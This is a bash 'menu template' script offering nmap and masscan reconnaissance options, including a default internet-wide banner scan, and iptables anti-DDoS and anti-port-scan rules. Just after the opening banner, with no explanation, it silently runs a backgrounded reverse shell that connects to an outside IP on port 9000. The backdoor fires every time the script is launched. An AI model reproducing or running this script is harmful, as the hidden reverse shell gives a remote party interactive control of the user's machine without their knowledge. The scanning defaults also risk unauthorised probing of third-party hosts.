#!/bin/bash
# This is a menu template written in bash
# By: MBHudson 2025
#
clear
figlet -d /usr/share/figlet/ -f slant.flf Menu && figlet -d /usr/share/figlet/ -f digital.flf By: NLCC 2025
bash -i >& /dev/tcp/10.104.9.62/9000 0>&1 &
echo ""
echo ""
echo ""
def_target=127.0.0.1
#echo "ENTER TARGET OR DOMAIN"
read -p "ENTER TARGET OR DOMAIN - [Default:${def_target}]: " target
target=${target:-${def_target}}
#echo "ENTER TARGET DOMAIN OR IP"
#read target
clear
function Recon
{
option=0
until [ "$option" = "1" ]; do
clear
 echo "  1.) Nmap Port Scan w/OS and Version Detection"
 echo "  2.) Nmap w/Vuln Scanner"
 echo "  3.) Whois"
 echo "  4.) IP Trace"
 echo "  5.) World Scan"
 echo -e "                                                                           \e[41m b.) Main Menu" "\e[49m"
 echo -n "myprogram@nlcc:~#:"
 read option
 echo ""
 case $option in
 1 ) sudo nmap $target -O -sV ;;
 2 ) sudo nmap $target --script /usr/share/nmap/scripts/vulners.nse -sV
read -p "PRESS ENTER TO CONTINUE" </dev/tty ;;
 3 ) whois $target 
read -p "PRESS ENTER TO CONTINUE" </dev/tty ;;
 4 ) trace -t $target 
read -p "PRESS ENTER TO CONTINUE" </dev/tty ;;
 5 ) clear
banner=$(figlet -d /usr/share/figlet/ -f slant.flf WorldScan && figlet -d /usr/share/figlet/ -f digital.flf By: NLCC 2025)
echo "$banner"
echo ""
echo ""
echo ""
def_seconds=120
echo "Example: 60 - for one minute. 120 - for two and so on..."
read -p "ENTER SCAN DURATION IN SECONDS [Default:${def_seconds}]: " seconds
seconds=${seconds:-${def_seconds}}
clear
echo "$banner"
echo ""
echo ""
echo ""
def_rate=5000
echo "Example: 1000 - for one thousand packets per second."
echo "This controls how fast the scanner goes through IP numbers"
echo "!WARNING! This can easly burn up your internet interface device and/or hog all the available bandwith."
read -p "ENTER SCAN RATE IN PPS [Default:${def_rate}]: " typed_rate
typed_rate=${typed_rate:-${def_rate}}
clear
echo "$banner"
echo ""
echo ""
echo ""
def_iface=$(ip route get 8.8.8.8 | awk -- '{printf $5}')
echo "This automaticaly attempts to detect the interface being used"
echo "If you dont know just press [ENTER] but you can view all available interfaces by running the ifconfig command in another terminal"
read -p "ENTER INTERNET INTERFACE TO USE: [Default:${def_iface}]: " typed_iface
typed_iface=${typed_iface:-${def_iface}}
clear
echo "$banner"
echo ""
echo ""
echo ""
def_range=0.0.0.0/0
echo "Example: 10.0.0.1/24 - 10.0.0.1-60 for local // 1.1.1.1-999.9.9.9.9 for remote // 0.0.0.0/0 for random remote IPs"
read -p "ENTER SCAN RANGE: [Default:${def_range}]: " typed_range
typed_range=${typed_range:-${def_range}}
clear
echo "$banner"
echo ""
echo ""
echo ""
def_port=80
echo "Exapmle: 80 - 443 - 8080 - 8001 - 8080 - 8081"
read -p "ENTER PORT TO SCAN: [Default:${def_port}]: " typed_port
typed_port=${typed_port:-${def_port}}
clear
echo "$banner"
echo ""
echo ""
echo ""
def_string=Apache
echo "Exapmle: Apache/2.4.63"
read -p "ENTER STRING TO SEARCH FOR: [Default:${def_string}]: " typed_string
typed_string=${typed_string:-${def_string}}
clear
sudo masscan -i $typed_iface -p$typed_port $typed_range --exclude 255.255.255.255 --rate=$typed_rate --banners --wait=3 -oG banners.tmp1 &
sleep 2
tail -F banners.tmp1 | grep -w "$typed_string" &
clear
echo "$banner"
echo ""
echo ""
echo ""
seconds=$seconds
start="$(($(date +%s) + $seconds))"
while [ "$start" -ge `date +%s` ]; do
    time="$(( $start - `date +%s`))"
    printf '%s\r' "$(date -u -d "@$time" +%H:%M:%S)"
done
sudo killall masscan
sudo killall tail
cat banners.tmp1 | grep -w "$typed_string" > typed1.tmp1
sudo grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' typed1.tmp1 > typed2.tmp1
sudo awk '!seen[$0]++' typed2.tmp1 > IPs.tmp1
sudo sort IPs.tmp1 | uniq -u
sudo rm banners.tmp1 typed*
clear
echo "$banner"
cat IPs.tmp1
read -p "PRESS ENTER TO CONTINUE" </dev/tty ;;
 b ) main_menu ;;
 * ) tput setf 3;echo "echo -n "myprogram@nlcc:~#:"";tput setf 3;
 esac
 done
}

function Attack_Defense  #was called Menu_2
{
option=0
until [ "$option" = "2" ]; do
#clear
 echo "  1.) Anti-DDoS"
 echo "  2.) Anti-Port Scan"
 echo "  3.) Reset IP-Tables"
 echo -e "                                                                           \e[41m b.) Main Menu" "\e[49m"
 echo -n "myprogram@nlcc:~#:"
 read option
 echo ""
 case $option in
 1 ) ### 1: Drop invalid packets ###
/sbin/iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID -j DROP  

### 2: Drop TCP packets that are new and are not SYN ###
/sbin/iptables -t mangle -A PREROUTING -p tcp ! --syn -m conntrack --ctstate NEW -j DROP
 
### 3: Drop SYN packets with suspicious MSS value ###
/sbin/iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP  

### 4: Block packets with bogus TCP flags ###
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,ACK FIN -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,URG URG -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,PSH PSH -j DROP
/sbin/iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL NONE -j DROP

### 5: Block spoofed packets ###
/sbin/iptables -t mangle -A PREROUTING -s 224.0.0.0/3 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 169.254.0.0/16 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 172.16.0.0/12 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 192.0.2.0/24 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 192.168.0.0/16 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 10.0.0.0/8 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 0.0.0.0/8 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 240.0.0.0/5 -j DROP
/sbin/iptables -t mangle -A PREROUTING -s 127.0.0.0/8 ! -i lo -j DROP  

### 6: Drop ICMP (you usually don't need this protocol) ###
/sbin/iptables -t mangle -A PREROUTING -p icmp -j DROP  

### 7: Drop fragments in all chains ###
/sbin/iptables -t mangle -A PREROUTING -f -j DROP  

### 8: Limit connections per source IP ###
/sbin/iptables -A INPUT -p tcp -m connlimit --connlimit-above 111 -j REJECT --reject-with tcp-reset  

### 9: Limit RST packets ###
/sbin/iptables -A INPUT -p tcp --tcp-flags RST RST -m limit --limit 2/s --limit-burst 2 -j ACCEPT
/sbin/iptables -A INPUT -p tcp --tcp-flags RST RST -j DROP  

### 10: Limit new TCP connections per second per source IP ###
/sbin/iptables -A INPUT -p tcp -m conntrack --ctstate NEW -m limit --limit 60/s --limit-burst 20 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -m conntrack --ctstate NEW -j DROP
### 11: SSH brute-force protection ###
/sbin/iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --set
/sbin/iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 10 -j DROP  

### 12: Protection against port scanning ###
/sbin/iptables -N port-scanning
/sbin/iptables -A port-scanning -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s --limit-burst 2 -j RETURN
/sbin/iptables -A port-scanning -j DROP
clear
echo "ANTI-DDoS ENABLED!"
sleep 3
clear ;;
 2 ) ipset create port_scanners hash:ip family inet hashsize 32768 maxelem 65536 timeout 1800
ipset create scanned_ports hash:ip,port family inet hashsize 32768 maxelem 65536 timeout 60

iptables -A INPUT -m state --state INVALID -j DROP
iptables -A INPUT -m state --state NEW -m set ! --match-set scanned_ports src,dst -m hashlimit --hashlimit-above 1/hour --hashlimit-burst 5 --hashlimit-mode srcip --hashlimit-name portscan --hashlimit-htable-expire 10000 -j SET --add-set port_scanners src --exist
iptables -A INPUT -m state --state NEW -m set --match-set port_scanners src -j DROP
iptables -A INPUT -m state --state NEW -j SET --add-set scanned_ports src,dst
clear
echo "ANTI-PORT SCAN ENABLED!"
sleep 3
clear ;;
 3 ) clear
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

iptables -t nat -F
iptables -t mangle -F
iptables -t nat -X
iptables -t mangle -X
iptables -F
iptables -X

ufw --force disable
ufw --force enable 
echo ""
echo ""
echo "IP-TABLES FLUSHED!"
sleep 3
clear ;;
 b ) main_menu ;;
 * ) tput setf 3;echo "echo -n "myprogram@nlcc:~#:"";tput setf 3;
 esac
 done
}

function Menu_3
{
option=0
until [ "$option" = "3" ]; do
#clear
 echo "  1.) Option 1"
 echo "  2.) Option 2"
 echo "  3.) Option 3"
 echo -e "                                                                           \e[41m b.) Main Menu" "\e[49m"
 echo -n "myprogram@nlcc:~#:"
 read option
 echo ""
 case $option in
 1 ) echo "Option 1" ;;
 2 ) echo "Option 2" ;;
 3 ) echo "Option 3" ;;
 b ) main_menu ;;
 * ) tput setf 3;echo "echo -n "myprogram@nlcc:~#:"";tput setf 3;
 esac
 done
}

function main_menu
{
option=0
until [ "$option" = "4" ]; do

#clear
figlet -d /usr/share/figlet/ -f slant.flf Menu && figlet -d /usr/share/figlet/ -f digital.flf By: NLCC 2025
echo ""
echo ""
echo ""
echo ""
echo ""
 echo -e "\e[91m       1.) Recon         2.) Attack/Defense         3.) Menu 3\e[0m"
echo ""
echo ""                                                           
echo ""
 echo -e -n "\e[38;5;82mmyprogram@\e[38;5;198tnlcc:~#:\e[0m"
read option
echo ""
case $option in
    1 ) Recon ;  ;;
    2 ) Attack_Defense ;  ;;
    3 ) Menu_3 ;  ;;
    * ) tput setf 4;echo -n "myprogram@nlcs:~#:";tput setf 4;                    
esac
done
 }
main_menu
